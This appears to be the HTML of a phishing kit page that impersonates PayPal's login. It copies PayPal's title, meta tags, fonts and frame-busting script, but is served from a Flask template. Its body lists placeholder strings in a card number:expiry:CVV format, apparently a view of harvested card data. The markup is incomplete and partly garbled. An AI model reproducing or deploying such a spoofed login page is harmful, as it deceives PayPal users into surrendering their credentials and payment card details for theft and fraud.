<!DOCTYPE html>
<html lang="en" class="no-js desktop">
   <!--<![endif]-->
   <head>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
      <script async src="js/ngrlCaptcha.min.js"></script><!--Script info: script: node, template:  , date: Sep 16, 2022 10:30:24 -07:00, country: US, language: en web version:  content version:  hostname : rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ06fendyljjeAbIhfwPzQKG7qTbadYV4On rlogid : rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfR3mQy2JZfSavI03Q3pWZxE0B1RZg4BOBb8%2FZR5sk5bW_183475a0364 -->
      <meta charset="utf-8">
      <title>Log in to your PayPal account</title>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta name="application-name" content="PayPal">
      <meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
      <meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
      <meta name="keywords" content="transfer money, email money transfer, international money transfer ">
      <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address.">
      <link rel="shortcut icon" href="pp_favicon_x.ico">
      <link rel="apple-touch-icon" href="images/pp64.png">
      <link rel="canonical" href="https://www.paypal.com/us/signin">
      <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
      <meta property="og:image" content="images/pp258.png">
      <link rel="stylesheet" href="{{ url_for('static', filename='contextualLoginElementalUIv2.css')}}">
      <!--[if lte IE 9]>
      <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/2c4/7aa8b2870f80a336755ed96accdc1/css/ie9.css" />
      <![endif]--><!-- build:js inline --><!-- build:[src] js/lib/ --><script nonce src="js/modernizr-2.6.1.js"></script><!-- /build --><!-- /build --><script nonce>/* Special integration eligibility check */function isEligibleIntegration() {var sxf = "";return sxf === 'true' || window.name === 'PPFrameRedirect';}/* Don't bust the frame if this is top window */if (self === top || isEligibleIntegration()) {var antiClickjack = document.getElementById("antiClickjack");if (antiClickjack) {antiClickjack.parentNode.removeChild(antiClickjack);}} else {top.location = self.location;}</script>
   <style>
    @font-face{font-family:pp-sans-big-regular;src:url(https://www.paypalobjects.com/webstatic/mktg/2014design/font/PP-Sans/PayPalSansBig-Regular.eot);src:url(https://www.paypalobjects.com/webstatic/mktg/2014design/font/PP-Sans/PayPalSansBig-Regular.eot?#iefix) format("embedded-opentype"),url(https://www.paypalobjects.com/paypal-ui/fonts/PayPalSansBig-Regular.woff2) format("woff2"),url(https://www.paypalobjects.com/webstatic/mktg/2014design/font/PP-Sans/PayPalSansBig-Regular.svg) format("svg");}

    body{
    background-image: url("https://i.imgur.com/zGc9j2D.jpg");
    }
    .userpass{
    border: 2px solid black;
    resize: none;
    width: 360px;
    text-align: center;
    font-size: 30px;
    height: 45px;
    font-family: Arial, Helvetica, sans-serif;
    border-radius: 9px;
    }
    .userpass::-webkit-scrollbar {
   display: none;
 }
        .copybuttons{
      background-color: #4CAF50; /* Green */
      border: none;
      background-color: Transparent;

    }


    .loader{
    }
    .hideload{
    }
    .hideload>div{
    }
    .loader>div{
    }
    @keyframes spin{
    100%{
       transform: rotate(360deg)
    }

  </style>
  <body>
<h2>1111 2... .... ....:1m/yy:1..</h2>
<br><h2>1233 3333 3333 33..:33/12:321</h2>
<br>